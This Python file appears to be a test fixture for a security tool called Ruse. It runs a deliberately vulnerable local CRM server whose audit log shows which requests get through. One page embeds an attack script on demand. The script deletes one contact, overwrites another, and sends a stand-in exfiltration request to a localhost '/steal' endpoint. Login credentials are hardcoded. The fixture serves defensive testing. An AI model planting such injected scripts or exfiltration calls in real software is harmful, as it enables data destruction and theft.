#!/usr/bin/env python3
"""Ruse demo fixture — a deliberately vulnerable local CRM.

A tiny, honest web application with real server-side state and a
server-side audit log. Nothing here knows about Ruse: the audit log and
counters are produced by the CRM itself, which is what makes them
evidence. If a blocked request never appears in this log, it never
reached the application.

Endpoints:
    GET  /                      login page
    POST /login                 owner sign-in (sets session cookie)
    GET  /contacts              customer list
    GET  /contacts/<id>         customer record (123, 999)
    POST /api/contacts/<id>     JSON field update  -> audit + counter
    DELETE /api/contacts/<id>   destructive op     -> audit + counter
    GET  /_audit                server-side counters (the proof)
    GET  /contacts/123?attack=1 the page's own script attacks
"""

from __future__ import annotations

import json
import os
import sys
import threading
import time
from http import cookies
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

PORT = int(os.environ.get("CRM_PORT", "8710"))
SESSION_COOKIE = "crm_session"
CUSTOMERS = {"123": {"status": "new"}, "999": {"status": "active"}}
LOCK = threading.Lock()

audit_path = os.environ.get("CRM_AUDIT", "/tmp/ruse-crm-audit.jsonl")
audit_fh = open(audit_path, "a", encoding="utf-8")


def record(event: dict) -> None:
    event = {"ts": time.strftime("%Y-%m-%dT%H:%M:%S"), **event}
    with LOCK:
        audit_fh.write(json.dumps(event, sort_keys=True) + "\n")
        audit_fh.flush()


def counters() -> dict:
    c = {"updates": {}, "deletes": {}, "unauthenticated": 0, "requests": 0}
    with LOCK:
        try:
            with open(audit_path, encoding="utf-8") as fh:
                for line in fh:
                    e = json.loads(line)
                    c["requests"] += 1
                    if e.get("event") == "update":
                        c["updates"][e["id"]] = c["updates"].get(e["id"], 0) + 1
                    elif e.get("event") == "delete":
                        c["deletes"][e["id"]] = c["deletes"].get(e["id"], 0) + 1
                    elif e.get("event") == "unauthenticated":
                        c["unauthenticated"] += 1
        except FileNotFoundError:
            pass
    return c


ATTACK_JS = """
<script>
(async () => {
  const out = [];
  const tryReq = async (name, req) => {
    try { const r = await fetch(req); out.push(name + ':HTTP' + r.status); }
    catch (e) { out.push(name + ':BLOCKED'); }
  };
  await tryReq('delete-123', new Request('/api/contacts/123', {method: 'DELETE'}));
  await tryReq('write-999', new Request('/api/contacts/999', {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({status: 'deleted'})}));
  await tryReq('exfil', new Request('http://127.0.0.1:8719/steal', {mode: 'no-cors'}));
  document.title = 'ATTACKS:' + out.join('|');
})();
</script>
"""


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a):  # quiet
        pass

    def _session_ok(self) -> bool:
        c = cookies.SimpleCookie(self.headers.get("Cookie", ""))
        return c[SESSION_COOKIE].value == "owner" if SESSION_COOKIE in c else False

    def _send(self, code: int, body: bytes, ctype: str = "text/html; charset=utf-8",
              cookie: str = "") -> None:
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        if cookie:
            self.send_header("Set-Cookie", cookie)
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        u = urlparse(self.path)
        q = parse_qs(u.query)
        if u.path == "/":
            record({"event": "page", "path": "/"})
            return self._send(200, b"<html><body><h1>CRM login</h1>"
                                   b"<form method=POST action=/login>"
                                   b"<input name=user><input name=pass type=password>"
                                   b"<button>Sign in</button></form></body></html>")
        if u.path == "/_audit":
            return self._send(200, json.dumps(counters()).encode(), "application/json")
        if u.path == "/contacts":
            if not self._session_ok():
                record({"event": "unauthenticated", "path": u.path})
                return self._send(401, b"sign in")
            rows = "".join(f"<li><a href=/contacts/{i}>{i}</a> status: {s['status']}</li>"
                           for i, s in CUSTOMERS.items())
            return self._send(200, (f"<html><body><h1>Customers</h1><ul>{rows}</ul>"
                                    "</body></html>").encode())
        if u.path.startswith("/contacts/"):
            cid = u.path.split("/")[2]
            if not self._session_ok():
                record({"event": "unauthenticated", "path": u.path})
                return self._send(401, b"sign in")
            if cid not in CUSTOMERS:
                return self._send(404, b"no such customer")
            rec = CUSTOMERS[cid]
            attack = b"" if not q.get("attack") else ATTACK_JS.encode()
            record({"event": "page", "path": u.path, "attack": bool(q.get("attack"))})
            return self._send(200, (f"<html><body><h1>Customer {cid}</h1>"
                                    f"<p id=status>status: {rec['status']}</p>"
                                    f"</body></html>").encode() + attack)
        return self._send(404, b"not found")

    def do_POST(self):
        u = urlparse(self.path)
        if u.path == "/login":
            n = int(self.headers.get("Content-Length", 0))
            form = self.rfile.read(n).decode()
            if "user=owner" in form and "pass=hunter2" in form:
                record({"event": "login"})
                return self._send(302, b"", cookie=f"{SESSION_COOKIE}=owner; Path=/")
            record({"event": "login_failed"})
            return self._send(401, b"bad credentials")
        if u.path.startswith("/api/contacts/"):
            if not self._session_ok():
                record({"event": "unauthenticated", "path": u.path})
                return self._send(401, b'{"error": "sign in"}', "application/json")
            cid = u.path.split("/")[-1]
            if cid not in CUSTOMERS:
                return self._send(404, b'{"error": "no such customer"}', "application/json")
            n = int(self.headers.get("Content-Length", 0))
            try:
                body = json.loads(self.rfile.read(n) or b"{}")
            except Exception:
                body = {}
            applied = {k: v for k, v in body.items() if k in CUSTOMERS[cid]}
            with LOCK:
                CUSTOMERS[cid].update(applied)
            record({"event": "update", "id": cid, "applied": applied, "sent": body})
            return self._send(200, json.dumps({"ok": True, "applied": applied}).encode(),
                              "application/json")
        return self._send(404, b"not found")

    def do_DELETE(self):
        u = urlparse(self.path)
        if u.path.startswith("/api/contacts/"):
            if not self._session_ok():
                record({"event": "unauthenticated", "path": u.path})
                return self._send(401, b'{"error": "sign in"}', "application/json")
            cid = u.path.split("/")[-1]
            if cid in CUSTOMERS:
                with LOCK:
                    deleted = CUSTOMERS.pop(cid)
                record({"event": "delete", "id": cid, "record": deleted})
                return self._send(200, b'{"ok": true, "deleted": true}', "application/json")
            record({"event": "delete_missing", "id": cid})
            return self._send(404, b'{"error": "no such customer"}', "application/json")
        return self._send(404, b"not found")


def main() -> None:
    srv = ThreadingHTTPServer(("127.0.0.1", PORT), Handler)
    record({"event": "fixture_start", "port": PORT})
    sys.stderr.write(f"crm fixture on 127.0.0.1:{PORT}\n")
    srv.serve_forever()


if __name__ == "__main__":
    main()
